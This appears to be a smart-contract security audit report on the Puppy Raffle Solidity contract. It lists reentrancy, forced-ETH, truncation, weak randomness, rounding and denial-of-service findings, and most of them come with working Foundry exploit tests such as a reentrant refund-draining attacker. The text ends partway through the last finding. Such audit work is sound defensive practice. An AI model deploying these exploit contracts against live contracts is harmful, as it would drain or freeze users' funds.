# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

**Puppy Raffle Protocol (Solidity 0.7.6)**  
A time-boxed raffle where players purchase entries to win an on-chain Puppy NFT and 80 % of the ether pot. Each ticket costs `entranceFee` (default 1 ETH).  

1. **Entering**  
   • Anyone calls `enterRaffle(address[] participants)` sending `entranceFee × n`.  
   • All supplied addresses are recorded as active players; duplicates revert.  

2. **Refunds**  
   • Before the draw, a player may call `refund(index)` to reclaim their full fee; their slot in `players` is zero-ed.  

3. **Drawing a Winner**  
   • After `raffleDuration` (default 24 h) and with ≥ 4 active players, anyone can call `selectWinner()`.  
   • Pseudo-randomly chooses a winner, determines NFT rarity (common/rare/legendary), mints an ERC-721 Puppy with on-chain metadata, and sends:  
     – 80 % of contract balance to the winner.  
     – 20 % accumulated into `totalFees`.  
   • Resets player list and start time for the next round.  

4. **Fee Handling**  
   • Owner can update `feeAddress` via `changeFeeAddress`.  
   • When no active players remain (`balance == totalFees`) the owner withdraws fees through `withdrawFees()`.  

5. **Deployment Script**  
   `DeployPuppyRaffle.sol` broadcasts a deployment using the caller as `feeAddress`.  

Comprehensive tests verify entry logic, refunds, winner selection, NFT metadata, payout splits, and fee withdrawal, ensuring protocol integrity.
## High Risk Findings

[H-1]. Reentrancy in PuppyRaffle.refund lets a malicious entrant reenter and claim entranceFee multiple times, draining the pot

 **Derived From** : Refund reentrancy: external call before zeroing player allows multi-refund drain

[H-2]. Forced ETH breaks balance==totalFees invariant in PuppyRaffle.withdrawFees, DoSing fee withdrawals

 **Derived From** : Fee withdrawal gated by balance==totalFees is DoS-able via forced ETH

[H-3]. uint64 fee truncation in PuppyRaffle.selectWinner corrupts accounting and permanently bricks withdrawFees

 **Derived From** : uint64 truncation of fees breaks accounting; ≥93 players at 1 ETH bricks withdrawals

[H-4]. Miner-influenced RNG in PuppyRaffle.selectWinner via block.timestamp lets attacker force a win and steal prize pool

 **Derived From** : Miner timestamp manipulation can influence RNG outcome

[H-5]. Rounding in PuppyRaffle.selectWinner leaves 1 wei dust; withdrawFees strict equality bricks fee withdrawals

 **Derived From** : 80/20 split uses integer division; dust can desync balance vs totalFees

## Medium Risk Findings

[M-1]. Unbounded O(n^2) duplicate scan in PuppyRaffle.enterRaffle lets attacker gas-DoS future entries

 **Derived From** : O(n^2) duplicate check in enterRaffle enables gas-based DoS

[M-2]. DoS in PuppyRaffle.selectWinner due to pot computed from players.length including refunded slots

 **Derived From** : Prize pool computed from players.length includes refunded slots; winner selection DoS

[M-3]. selectWinner DoS: winner.call ETH payout and _safeMint onERC721Received let a malicious winner brick draws

 **Derived From** : Winner payout + ERC721 receiver hook can grief selectWinner



### Number of Findings
- C: 0
- H: 5
- M: 3
- L: 0
- I: 0



# High Risk Findings

## [H-1]. Reentrancy in PuppyRaffle.refund lets a malicious entrant reenter and claim entranceFee multiple times, draining the pot

## Derived From Pattern/Invariant
Refund reentrancy: external call before zeroing player allows multi-refund drain

## Exploit Type
Reentrancy

## Location
PuppyRaffle.refund

## Minimim Privilege Required
Permissionless

## Description
refund performs an external ETH transfer to msg.sender via Address.sendValue before clearing the player's slot. Because players[playerIndex] still equals msg.sender during the external call, a malicious entrant contract can reenter refund(playerIndex) from its receive/fallback repeatedly to collect entranceFee multiple times. Address.sendValue forwards all gas, there is no reentrancy guard, and state is only updated after the external interaction, enabling a drain of the contract balance until depletion or gas exhaustion.

Vulnerable snippet:
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "...");
    require(playerAddress != address(0), "...");
    payable(msg.sender).sendValue(entranceFee); // external call before effects
    players[playerIndex] = address(0);          // state cleared too late
}


## Impact
A malicious entrant can repeatedly reenter refund to withdraw entranceFee multiple times, draining all ETH held (ticket pot and potentially accrued fees), preventing other players from refunding and breaking prize payouts.

## Proof of Concept
1) Attacker deploys a contract with a receive() that, upon receiving ETH from refund, immediately calls refund(playerIndex) again while a counter < maxReentries.
2) Attacker gets included as a player (either self-funding or sponsored).
3) With multiple participants paid in, attacker calls attack(index, maxReentries). Because players[index] still equals attacker until after the external call returns, each reentry passes the require checks and sends entranceFee again.
4) Repeat until the balance is drained (e.g., 4 participants → 4 refunds). The final state sets the slot to zero, but the funds are already siphoned.

## Proof of Code
pragma solidity ^0.7.6;

import "ds-test/test.sol";
import "../src/PuppyRaffle.sol";

// hevm cheat-codes interface (solidity 0.7.x compatible)
interface Vm {
    function deal(address who, uint256 newBalance) external;
}

// Re-entrant attacker
contract ReentrantRefundAttacker {
    PuppyRaffle public raffle;
    uint256 public targetIndex;
    uint256 public remaining;

    constructor(PuppyRaffle _raffle) {
        raffle = _raffle;
    }

    function attack(uint256 index, uint256 times) external {
        targetIndex = index;
        remaining = times;
        raffle.refund(index); // first refund → receive() will re-enter
    }

    receive() external payable {
        if (remaining > 0) {
            remaining--;
            raffle.refund(targetIndex);
        }
    }
}

contract RefundReentrancyTest is DSTest {
    // Instantiate hevm cheat-codes
    Vm internal constant vm = Vm(address(uint160(uint256(keccak256('hevm cheat code')))));

    PuppyRaffle raffle;
    ReentrantRefundAttacker attacker;
    address p1 = address(0x1);
    address p2 = address(0x2);
    address p3 = address(0x3);

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(0xFEE), 1 days);
        attacker = new ReentrantRefundAttacker(raffle);
        vm.deal(address(this), 10 ether); // give the test contract ETH to spend
    }

    function testRefundReentrancyDrainsPot() public {
        // 4 unique players, ticket price 1 ether each
        address[] memory players = new address[](4);
        players[0] = address(attacker);
        players[1] = p1;
        players[2] = p2;
        players[3] = p3;

        raffle.enterRaffle{value: 4 ether}(players);
        uint256 idx = raffle.getActivePlayerIndex(address(attacker));
        assertEq(idx, 0);
        assertEq(address(raffle).balance, 4 ether);

        // trigger refund re-entrancy: 1 initial + 3 nested refunds = 4 ether stolen
        attacker.attack(idx, 3);

        assertEq(address(raffle).balance, 0);
        assertEq(address(attacker).balance, 4 ether);
    }
}

## Suggested Mitigation
Apply checks-effects-interactions or a reentrancy guard. For example: set the player slot to zero before the external transfer, or add nonReentrant. Also prefer using a pull/withdraw pattern to avoid sending in refund.\n\nfunction refund(uint256 playerIndex) public nonReentrant {\n    address playerAddress = players[playerIndex];\n    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");\n    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");\n    players[playerIndex] = address(0); // effects first\n    Address.sendValue(payable(msg.sender), entranceFee); // interaction after state update\n    emit RaffleRefunded(playerAddress);\n}


## [H-2]. Forced ETH breaks balance==totalFees invariant in PuppyRaffle.withdrawFees, DoSing fee withdrawals

## Derived From Pattern/Invariant
Fee withdrawal gated by balance==totalFees is DoS-able via forced ETH

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.withdrawFees

## Minimim Privilege Required
Permissionless

## Description
PuppyRaffle.withdrawFees assumes the contract balance equals accumulated fees and gates withdrawals on strict equality. Anyone can force ETH into the contract via selfdestruct (or pre-send), making address(this).balance > totalFees. This permanently breaks the equality invariant and bricks fee withdrawals, trapping all future fees. Vulnerable snippet:

function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}

## Impact
Permanent DoS of fee withdrawals; accumulated protocol fees become stuck in the contract with no sweep path, causing direct revenue loss to the feeAddress.

## Proof of Concept
1) Attacker deploys a minimal contract with a selfdestruct that targets PuppyRaffle.
2) Attacker funds it with 1 wei and calls selfdestruct to force-send 1 wei to PuppyRaffle.
3) Normal users run a round: 4 entries at 1 ETH, then selectWinner(). Contract accrues 0.8 ETH in totalFees and holds prizePool already paid.
4) Now address(this).balance == totalFees + 1 wei. The strict equality check fails and withdrawFees reverts forever.
5) All future fees also become unwithdrawable since the forced wei remains, permanently bricking fee withdrawals.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract ForceSend {
    function destroyAndSend(address payable to) external payable {
        selfdestruct(to);
    }
}

contract ForcedEthBricksWithdrawFeesTest is Test {
    PuppyRaffle raffle;
    address feeRecipient = address(0xBEEF);
    uint256 entranceFee = 1 ether;
    uint256 duration = 1 days;

    function setUp() public {
        raffle = new PuppyRaffle(entranceFee, feeRecipient, duration);
    }

    function test_forcedEthBricksWithdrawFees() public {
        // 1) Force-send 1 wei into the raffle via selfdestruct
        ForceSend fs = new ForceSend();
        vm.deal(address(fs), 1);
        fs.destroyAndSend(payable(address(raffle)));
        assertEq(address(raffle).balance, 1);

        // 2) Enter 4 players paying 4 ETH total
        address[] memory players = new address[](4);
        players[0] = address(0x1);
        players[1] = address(0x2);
        players[2] = address(0x3);
        players[3] = address(0x4);
        vm.deal(address(this), 4 ether);
        raffle.enterRaffle{value: 4 ether}(players);

        // 3) Advance time and select winner
        vm.warp(block.timestamp + duration);
        raffle.selectWinner();

        // totalFees should be 0.8 ETH, but balance has +1 wei extra
        uint64 fees = raffle.totalFees();
        assertEq(address(raffle).balance, uint256(fees) + 1);
        assertGt(uint256(fees), 0);

        // 4) Withdraw should revert due to strict equality check
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}


## Suggested Mitigation
Do not gate on address(this).balance == totalFees. Instead, (a) gate withdrawal on no active players, e.g., require(players.length == 0, "players active"); and (b) transfer exactly totalFees. Optionally add a sweep for excess ETH. Example:

function withdrawFees() external {
    require(players.length == 0, "PuppyRaffle: There are currently players active!");
    uint256 amount = uint256(totalFees);
    totalFees = 0;
    (bool ok,) = feeAddress.call{value: amount}("");
    require(ok, "PuppyRaffle: Failed to withdraw fees");
}

Optionally add: function sweepExcess(address to) external onlyOwner { uint256 excess = address(this).balance - uint256(totalFees); (bool s,) = to.call{value: excess}(""); require(s, "sweep failed"); }


## [H-3]. uint64 fee truncation in PuppyRaffle.selectWinner corrupts accounting and permanently bricks withdrawFees

## Derived From Pattern/Invariant
uint64 truncation of fees breaks accounting; ≥93 players at 1 ETH bricks withdrawals

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Description
totalFees is a uint64 but fee is computed as uint256 then cast down. When the 20% fee per round exceeds 2^64-1 wei, the cast wraps/truncates. With entranceFee=1 ether and 93 players: fee = 93e18 * 20% = 18.6e18 wei > 2^64-1 (≈18.4467e18 wei). The contract balance receives the full 18.6 ETH, but totalFees only increases by 18.6e18 - 2^64 ≈ 0.153255926290448384 ETH. withdrawFees enforces balance == totalFees, so it will always revert and fees become permanently locked; subsequent rounds further desynchronize accounting.
Vulnerable snippet:
uint64 public totalFees = 0;
...
uint256 totalAmountCollected = players.length * entranceFee;
uint256 fee = (totalAmountCollected * 20) / 100;
totalFees = totalFees + uint64(fee); // narrowing cast causes wrap/truncation

## Impact
Permanent fee lock and accounting corruption: address(this).balance holds full fees while totalFees records a truncated amount. withdrawFees perma-reverts (balance != totalFees), blocking treasury withdrawal across all future rounds.

## Proof of Concept
1) Attacker prepares 93 unique EOA addresses.
2) Attacker calls enterRaffle with those 93 addresses, sending 93 ETH (assuming entranceFee=1 ETH).
3) After raffleDuration, attacker calls selectWinner(). Contract sends 80% (74.4 ETH) to a random winner and retains 20% (18.6 ETH) in balance.
4) Due to uint64 cast, totalFees only increases by ~0.153255926290448384 ETH instead of 18.6 ETH.
5) Calling withdrawFees reverts on require(address(this).balance == uint256(totalFees)), bricking fee withdrawals. Future rounds only worsen the mismatch.

## Proof of Code
pragma solidity ^0.7.6;\nimport "forge-std/Test.sol";\nimport {PuppyRaffle} from "../src/PuppyRaffle.sol";\n\ncontract TruncationInvariantTest is Test {\n    PuppyRaffle raffle;\n    address attacker = address(0xA11CE);\n    address feeAddress = address(0xFEE);\n\n    function setUp() public {\n        vm.deal(attacker, 200 ether);\n        raffle = new PuppyRaffle(1 ether, feeAddress, 1);\n    }\n\n    function test_uint64FeeTruncationLocksFees() public {\n        // Prepare 93 unique entrants (≥93 triggers fee > 2^64-1 wei)\n        address[] memory entrants = new address[](93);\n        for (uint256 i = 0; i < 93; i++) {\n            entrants[i] = address(uint160(i + 1)); // non-zero, unique EOAs\n        }\n\n        vm.prank(attacker);\n        raffle.enterRaffle{value: 93 ether}(entrants);\n\n        // End the raffle window\n        vm.warp(block.timestamp + 2);\n\n        // Anyone can draw the winner\n        vm.prank(attacker);\n        raffle.selectWinner();\n\n        // Contract holds full 20% fee (18.6 ETH), but recorded totalFees is truncated to ~0.153255926290448384 ETH\n        uint256 expectedContractFee = (93 ether * 20) / 100; // 18.6 ether\n        uint256 expectedRecordedFees = 153255926290448384;   // 0.153255926290448384 ether\n\n        assertEq(address(raffle).balance, expectedContractFee);\n        assertEq(uint256(raffle.totalFees()), expectedRecordedFees);\n        assertGt(address(raffle).balance, uint256(raffle.totalFees()));\n\n        // Withdraw must revert due to broken invariant (balance != totalFees)\n        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));\n        raffle.withdrawFees();\n    }\n}

## Suggested Mitigation
- Use uint256 for totalFees and add without narrowing: totalFees = totalFees + fee;
- Alternatively, validate before casting: require(fee <= type(uint64).max - totalFees, "fee overflow");
- Avoid relying on address(this).balance == totalFees as a guard. Track active player deposits separately (e.g., pot accounting) or gate withdraw by players.length == 0 and a dedicated fees accumulator held in uint256.


## [H-4]. Miner-influenced RNG in PuppyRaffle.selectWinner via block.timestamp lets attacker force a win and steal prize pool

## Derived From Pattern/Invariant
Miner timestamp manipulation can influence RNG outcome

## Exploit Type
TimestampManipulation

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Description
selectWinner derives winnerIndex from keccak256(msg.sender, block.timestamp, block.difficulty) % players.length. Validators can legally skew block.timestamp within a small window and reorder transactions, allowing them (or a bribing attacker) to bias the modulo result to a chosen index. Because anyone can call selectWinner and msg.sender participates in the seed, a motivated actor can enter the raffle, search a nearby timestamp that maps to their index, then have their transaction mined at that timestamp, redirecting 80% of the pot to themselves. Vulnerable snippet:

"uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;"

## Impact
Attacker can bias winner selection to themselves and capture 80% of the pot; fairness and NFT distribution compromised

## Proof of Concept
1) Attacker enters the raffle among ≥4 players.
2) After raffleDuration, attacker (or colluding validator) searches a small legal timestamp skew window [end, end+Δ] to find a ts where uint256(keccak256(abi.encodePacked(attacker, ts, difficulty))) % players.length == attackerIndex.
3) Attacker submits a private transaction (e.g., via MEV relay) to call selectWinner at ts; validator sets block.timestamp to ts.
4) Contract computes winnerIndex using manipulated timestamp, attacker becomes winner, and immediately receives 80% of the pot plus the NFT.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract TimestampManipulationSelectWinnerTest is Test {
    PuppyRaffle pr;
    address fee = address(0xFEE);
    address attacker = address(0xA11CE);
    address p2 = address(0xBEEF);
    address p3 = address(0xB0B);
    address p4 = address(0xCAFE);
    uint256 entranceFee = 1 ether;
    uint256 duration = 1 hours;

    function setUp() public {
        vm.warp(100); // raffleStartTime in constructor
        pr = new PuppyRaffle(entranceFee, fee, duration);
        vm.deal(address(this), 10 ether);

        address[] memory players = new address[](4);
        players[0] = attacker; // attacker index = 0
        players[1] = p2;
        players[2] = p3;
        players[3] = p4;
        pr.enterRaffle{value: 4 ether}(players);
    }

    function test_MinerCanSkewTimestampToMakeAttackerWin() public {
        vm.difficulty(123456); // simulate fixed difficulty/prevrandao
        uint256 endTs = pr.raffleStartTime() + pr.raffleDuration();

        // Search a small legal skew window for a timestamp that makes attacker index 0 the winner
        uint256 chosenTs = 0;
        for (uint256 i = 0; i < 60; i++) { // ±1 minute window demo
            uint256 ts = endTs + i;
            bytes32 h = keccak256(abi.encodePacked(attacker, ts, block.difficulty));
            if (uint256(h) % 4 == 0) { // players.length == 4
                chosenTs = ts;
                break;
            }
        }
        assertGt(chosenTs, 0, "No biased timestamp found in window");

        uint256 attackerBefore = attacker.balance;
        uint256 total = 4 * entranceFee;
        uint256 expectedPrize = (total * 80) / 100;

        vm.warp(chosenTs);          // miner skew
        vm.prank(attacker);         // caller influences seed
        pr.selectWinner();

        assertEq(pr.previousWinner(), attacker, "attacker not selected");
        assertEq(attacker.balance, attackerBefore + expectedPrize, "incorrect prize");
    }
}


## Suggested Mitigation
Do not use block.timestamp/difficulty-derived entropy. Use a commit-reveal or an external verifiable randomness (e.g., Chainlink VRF). Example: request VRF, and in the VRF callback compute winnerIndex = uint256(keccak256(abi.encode(rand))) % players.length; then finalize payouts. Alternatively, use a multi-block commit-reveal with user commits and a future blockhash, ensuring no party can pick the seed at selection time.


## [H-5]. Rounding in PuppyRaffle.selectWinner leaves 1 wei dust; withdrawFees strict equality bricks fee withdrawals

## Derived From Pattern/Invariant
80/20 split uses integer division; dust can desync balance vs totalFees

## Exploit Type
RoundingError

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Description
selectWinner computes prizePool and fee separately using integer division: prizePool = (T*80)/100; fee = (T*20)/100. When T = players.length * entranceFee is not divisible by 5, floor(0.8T)+floor(0.2T) < T by 1 wei, leaving dust in the contract. After paying prizePool, the contract balance becomes totalFees + 1, but withdrawFees requires address(this).balance == totalFees, permanently reverting and blocking fee withdrawal. Vulnerable snippet:

uint256 totalAmountCollected = players.length * entranceFee;
uint256 prizePool = (totalAmountCollected * 80) / 100;
uint256 fee = (totalAmountCollected * 20) / 100;
...
require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");

## Impact
Any time the entranceFee is not a multiple of 5, the division-rounding dust makes `address(this).balance` diverge from `totalFees`. Because `withdrawFees()` has a strict equality guard, **all protocol-owned ETH (20 % fees from every round) becomes permanently unwithdrawable**. The amount can grow unbounded round after round, and no privileged actor can recover it without upgrading / migrating the contract, representing an irreversible monetary loss to the protocol treasury.

## Proof of Concept
- Deploy PuppyRaffle with an entranceFee not divisible by 5 (e.g., 3 wei).
- Attacker funds 4 entrants (meets min players) and calls selectWinner after duration.
- T=12; prizePool=floor(9.6)=9; fee=floor(2.4)=2; dust=1. Contract balance after payout = totalFees(2) + dust(1) = 3.
- Calling withdrawFees reverts due to strict equality check, even though there are no active players.
- Repeating rounds accumulates dust, keeping withdrawals bricked.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract RoundingDustTest is Test {
    PuppyRaffle raffle;
    address feeAddress = address(0xFEE);
    address attacker = address(0xBEEF);

    function setUp() public {
        // entranceFee = 3 (not divisible by 5), duration = 1 sec
        raffle = new PuppyRaffle(3, feeAddress, 1);
        vm.deal(attacker, 1 ether);
    }

    function test_RoundingDustBlocksWithdrawFees() public {
        // Enter 4 players paying 12 wei total
        address[] memory entrants = new address[](4);
        entrants[0] = address(0x1);
        entrants[1] = address(0x2);
        entrants[2] = address(0x3);
        entrants[3] = address(0x4);

        vm.prank(attacker);
        raffle.enterRaffle{value: 12}(entrants);

        vm.warp(block.timestamp + 2);
        vm.prank(attacker);
        raffle.selectWinner();

        // T=12 -> prizePool=9, fee=2, dust=1 -> contract holds 3 (2 fees + 1 dust)
        assertEq(address(raffle).balance, 3);
        assertEq(uint256(raffle.totalFees()), 2);
        assertGt(address(raffle).balance, uint256(raffle.totalFees()));

        // Withdraw reverts due to strict equality: balance != totalFees
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}


## Suggested Mitigation
- Avoid double rounding. Compute only one side via division and derive the other by subtraction to ensure prize+fee == T:

  uint256 fee = totalAmountCollected / 5; // 20%
  uint256 prizePool = totalAmountCollected - fee; // 80% + remainder

- Alternatively, leave current math but relax the guard to also require no players active and allow minor dust: require(players.length == 0 && address(this).balance >= totalFees). Prefer the first fix to eliminate dust entirely.




# Medium Risk Findings

## [M-1]. Unbounded O(n^2) duplicate scan in PuppyRaffle.enterRaffle lets attacker gas-DoS future entries

## Derived From Pattern/Invariant
O(n^2) duplicate check in enterRaffle enables gas-based DoS

## Exploit Type
GasGriefBlockLimit

## Location
PuppyRaffle.enterRaffle

## Minimim Privilege Required
Permissionless

## Description
enterRaffle appends all newPlayers, then does a nested scan over the full players array to detect duplicates. This O(n^2) post-append check grows without bound. An attacker can keep adding unique addresses to inflate players so that later enterRaffle calls exceed the block gas limit and revert, DoS-ing deposits until the round is reset.
Vulnerable snippet:
"function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
    }
    // Check for duplicates
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    emit RaffleEnter(newPlayers);
}"

## Impact
Attacker can temporarily block all new entries by growing players until enterRaffle runs out of gas, stopping user participation and prize pool growth until the round ends and players are reset.

## Proof of Concept
- Attacker calls enterRaffle many times with arrays of unique addresses, inflating players length (n).
- Each subsequent enterRaffle performs ~n*(n-1)/2 pairwise checks, with gas rising superlinearly.
- After n is large enough, any new enterRaffle with a reasonable gas stipend exceeds block gas and reverts.
- Result: No one can enter until someone calls selectWinner (after duration) to delete players.
- This is a permissionless, repeatable DoS of the core deposit path.

## Proof of Code
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract GasLimitedCaller {
    function callEnterWithGas(PuppyRaffle r, address[] memory addrs, uint256 gasLimit) external payable returns (bool ok) {
        (ok,) = address(r).call{gas: gasLimit, value: msg.value}(
            abi.encodeWithSignature("enterRaffle(address[])", addrs)
        );
    }
}

contract UnboundedLoopsGasDoSTest is Test {
    PuppyRaffle raffleSmall;
    PuppyRaffle raffleLarge;
    GasLimitedCaller glc;
    uint256 constant FEE = 1e9; // cheap fee for test
    address attacker = address(0xA11CE);

    function setUp() public {
        glc = new GasLimitedCaller();
        raffleSmall = new PuppyRaffle(FEE, address(this), 1 days);
        raffleLarge = new PuppyRaffle(FEE, address(this), 1 days);
        vm.deal(attacker, 1_000 ether);
    }

    function _gen(uint256 start, uint256 count) internal pure returns (address[] memory list) {
        list = new address[](count);
        for (uint256 i = 0; i < count; i++) {
            list[i] = address(uint160(start + i + 1));
        }
    }

    function _massEnter(PuppyRaffle r, uint256 total) internal {
        uint256 batch = 50;
        uint256 idx = 0;
        while (idx < total) {
            uint256 n = total - idx;
            if (n > batch) n = batch;
            address[] memory addrs = _gen(idx, n);
            vm.prank(attacker);
            r.enterRaffle{value: FEE * n}(addrs);
            idx += n;
        }
    }

    function test_GasDOS_enterRaffle_unboundedLoops() public {
        // Baseline: small array size -> limited gas call succeeds
        _massEnter(raffleSmall, 40);
        address[] memory one = _gen(1e6, 1);
        (bool okSmall,) = address(glc).call{value: FEE}(
            abi.encodeWithSignature(
                "callEnterWithGas(address,address[],uint256)", address(raffleSmall), one, 2_000_000
            )
        );
        assertEq(okSmall ? 1 : 0, 1);

        // Attack: grow players so O(n^2) duplicate scan exceeds the same gas limit
        _massEnter(raffleLarge, 700); // ~245k pairwise checks
        (bool okLarge,) = address(glc).call{value: FEE}(
            abi.encodeWithSignature(
                "callEnterWithGas(address,address[],uint256)", address(raffleLarge), one, 2_000_000
            )
        );
        assertEq(okLarge ? 1 : 0, 0); // DoS: runs out of gas
    }
}


## Suggested Mitigation
- Never do an O(n^2) scan over the full players array. Validate before writing and use constant-time membership checks.

Concrete fix example:
- Track active membership in a mapping and only check the new batch:

"mapping(address => bool) public isPlayer;\n\nfunction enterRaffle(address[] memory newPlayers) public payable {\n    require(msg.value == entranceFee * newPlayers.length, \"PuppyRaffle: Must send enough to enter raffle\");\n    // Check duplicates within input and against existing set before any writes\n    mapping(address => bool) memory seen; // emulate with a temporary set in code or a small local mapping pattern\n    for (uint256 i; i < newPlayers.length; i++) {\n        address p = newPlayers[i];\n        require(p != address(0), \"invalid\");\n        require(!seen[p], \"dup in input\");\n        require(!isPlayer[p], \"already entered\");\n        seen[p] = true;\n    }\n    // Effects: write once after validation\n    for (uint256 i; i < newPlayers.length; i++) {\n        players.push(newPlayers[i]);\n        isPlayer[newPlayers[i]] = true;\n    }\n}\n\n// When resetting round: delete players; and also clear isPlayer via iterating only current players (O(k)) or use a new roundId mapping."
- Alternatively, maintain a roundId-based membership mapping: mapping(address => uint256) lastJoinedRound; and bump roundId on reset, making membership checks O(1) without clearing.


## [M-2]. DoS in PuppyRaffle.selectWinner due to pot computed from players.length including refunded slots

## Derived From Pattern/Invariant
Prize pool computed from players.length includes refunded slots; winner selection DoS

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Description
Refunds zero out players[i] but do not shrink the array. selectWinner computes totalAmountCollected = players.length * entranceFee, then prizePool = 80%. If a significant portion of entries were refunded, contract balance < prizePool and the value transfer reverts, bricking winner selection and preventing round progression and fee withdrawal. Vulnerable snippet:

uint256 totalAmountCollected = players.length * entranceFee; // counts refunded (address(0)) slots
uint256 prizePool = (totalAmountCollected * 80) / 100;
(bool success,) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");

## Impact
Permanent liveness break of winner selection until external ETH is forcibly injected; rounds cannot finalize, players array is never reset, and withdrawFees remains blocked

## Proof of Concept
1) Attacker prepares many unique EOAs they control.
2) Attacker calls enterRaffle with 5 addresses paying 5 × entranceFee.
3) Two of those EOAs call refund to reclaim entranceFee; their slots become address(0) but players.length remains 5.
4) Advance time past raffleDuration.
5) Anyone calling selectWinner will compute prizePool = 80% of (5 × entranceFee) = 4 × entranceFee while contract balance is only 3 × entranceFee, causing the value transfer to fail and revert. Since delete players happens before the transfer but is reverted with the tx, the array never resets, and selectWinner stays perpetually uncallable.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract PrizePoolAccountingDoSTest is Test {
    PuppyRaffle raffle;
    address feeAddr = address(0xFEE);
    uint256 entrance = 1 ether;
    uint256 duration = 1 days;

    address p1 = address(0xA1);
    address p2 = address(0xA2);
    address p3 = address(0xA3);
    address p4 = address(0xA4);
    address p5 = address(0xA5);

    function setUp() public {
        raffle = new PuppyRaffle(entrance, feeAddr, duration);
        // fund a sender to buy tickets for all participants
        vm.deal(address(this), 100 ether);
    }

    function test_SelectWinnerBrickedByRefundAccounting() public {
        // Enter 5 players
        address[] memory players = new address[](5);
        players[0] = p1; players[1] = p2; players[2] = p3; players[3] = p4; players[4] = p5;
        raffle.enterRaffle{value: 5 ether}(players);
        assertEq(address(raffle).balance, 5 ether);

        // Two players refund; their slots become address(0) but array length remains 5
        vm.prank(p2);
        raffle.refund(1);
        vm.prank(p3);
        raffle.refund(2);
        assertEq(address(raffle).balance, 3 ether);

        // Advance time so draw is allowed
        vm.warp(block.timestamp + duration + 1);

        // Prize pool = 80% of players.length * entranceFee = 0.8 * 5 ETH = 4 ETH
        // Balance = 3 ETH -> transfer fails -> revert with expected message
        vm.expectRevert(bytes("PuppyRaffle: Failed to send prize pool to winner"));
        raffle.selectWinner();

        // Ensure still stuck on next attempt (players array never reset due to revert)
        vm.expectRevert(bytes("PuppyRaffle: Failed to send prize pool to winner"));
        raffle.selectWinner();
    }
}


## Suggested Mitigation
- Compute pot from actual funds or active entries only. Options:
  1) Track activeCount (increment on entry, decrement on refund) and use activeCount * entranceFee for pot/fees.
  2) Use on-chain balance with fee accrual separation: uint256 pot = address(this).balance; uint256 prize = (pot * 80) / 100; uint256 fee = pot - prize; totalFees += uint64(fee). Ensure no residual funds besides current round exist.
- Additionally, compact the players array on refund (swap-and-pop) or maintain a separate active mapping to avoid zeroed slots.
- As a safety net, cap transfer by balance: uint256 prize = Math.min(prizePool, address(this).balance); but prefer correct pot calculation to preserve economics.


## [M-3]. selectWinner DoS: winner.call ETH payout and _safeMint onERC721Received let a malicious winner brick draws

## Derived From Pattern/Invariant
Winner payout + ERC721 receiver hook can grief selectWinner

## Exploit Type
Dos

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Description
selectWinner performs two untrusted external interactions back-to-back with no fallback path: (1) a low-level ETH transfer to the winner and (2) an ERC721 receiver hook via _safeMint. A malicious winner contract can revert in its payable fallback/receive (blocking the prize payment) or accept ETH and then revert in onERC721Received (blocking the mint). Because there is no try/catch or alternate payout/mint path, any such revert aborts the whole transaction, preventing round completion and keeping the raffle in a stuck state until another successful call (which an attacker can front‑run to continually grief). Vulnerable snippet:

 delete players;
 raffleStartTime = block.timestamp;
 previousWinner = winner;
 (bool success,) = winner.call{value: prizePool}("");
 require(success, "PuppyRaffle: Failed to send prize pool to winner");
 _safeMint(winner, tokenId);


## Impact
Attacker can repeatedly revert selectWinner, preventing round settlement, NFT mint, prize distribution, and fee withdrawals (until users refund themselves or the attacker stops). Liveness and user funds distribution are blocked.

## Proof of Concept
1) Attacker deploys MaliciousRevertOnReceive (reverts in receive) or MaliciousERC721Receiver (accepts ETH, reverts in onERC721Received).
2) Attacker enters the raffle once with the malicious contract address among ≥4 players.
